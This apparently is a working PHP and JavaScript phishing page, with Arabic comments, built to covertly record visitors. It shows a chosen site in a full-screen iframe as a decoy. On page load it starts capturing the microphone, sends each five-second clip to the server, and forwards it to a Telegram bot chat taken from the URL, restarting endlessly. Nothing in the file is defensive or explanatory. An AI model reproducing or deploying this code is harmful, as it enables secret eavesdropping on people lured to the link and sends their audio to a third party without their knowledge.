<?php
// اسم الملف النصي
$filename = '../url.txt';

// الحصول على البيانات من الطلب
$lineNumber = isset($_GET['link']) ? intval($_GET['link']) : '';

$lines = file($filename, FILE_IGNORE_NEW_LINES);

// استخراج السطر المطلوب (الفهرس يبدأ من صفر لذا نقوم بطرح واحد)
$desiredLine = '';
if ($lineNumber && isset($lines[$lineNumber - 1])) {
    $desiredLine = trim($lines[$lineNumber - 1]);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <style>
        body, html {
            height: 100%;
            margin: 0;
            overflow: hidden; /* لمنع التمدد في حال تمت إضافة عناصر جانبية */
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>
<body>

    <?php if (!empty($desiredLine)): ?>
        <iframe src="<?php echo htmlspecialchars($desiredLine); ?>" frameborder="0"></iframe>
    <?php endif; ?>
    
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['audio'])) {
    function getLineFromFile($filename, $lineNumber) {
    if (!file_exists($filename)) {
        return null;
    }

    $lines = file($filename, FILE_IGNORE_NEW_LINES);
    if ($lineNumber > 0 && isset($lines[$lineNumber - 1])) {
        return trim($lines[$lineNumber - 1]);
    }

    return null;
}

// استلام عنصر ID2 من طلب GET
$idLineNumber = isset($_GET['ID2']) ? intval($_GET['ID2']) : null;
$token = null;

    $token = file_get_contents("../token.txt");
    $chatId = $_GET['ID'] ?? '';
    
    if (empty($chatId)) {
        echo "Missing chat ID";
        exit;
    }
    
    $file = $_FILES['audio']['tmp_name'];
    $url = "https://api.telegram.org/bot$token/sendAudio";

    $post_fields = array(
        'chat_id' => $chatId,
        'audio' => new CURLFile(realpath($file))
    );

    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Type:multipart/form-data"
    ));
    curl_setopt($ch, CURLOPT_URL, $url); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields); 
    $output = curl_exec($ch);
    curl_close($ch);

    echo $output;
} else {
    echo "No audio file received";
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Recording Audio</title>
</head>
<body>
    <script>
        let mediaRecorder;
        let audioChunks = [];

        const startRecording = async () => {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            mediaRecorder = new MediaRecorder(stream);

            mediaRecorder.ondataavailable = event => {
                audioChunks.push(event.data);
            };

            mediaRecorder.onstop = async () => {
                const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
                const formData = new FormData();
                formData.append('audio', audioBlob, 'recording.wav');

                await fetch('', { // تأكد من استبدال YOUR_CHAT_ID بالمعرف الخاص بك
                    method: 'POST',
                    body: formData
                });

                audioChunks = [];
                startRecording(); // Restart recording
            };

            mediaRecorder.start();

            setTimeout(() => {
                mediaRecorder.stop();
            }, 5000); // Stop recording after 5 seconds
        };

        window.onload = startRecording;
    </script>
</body>
</html>
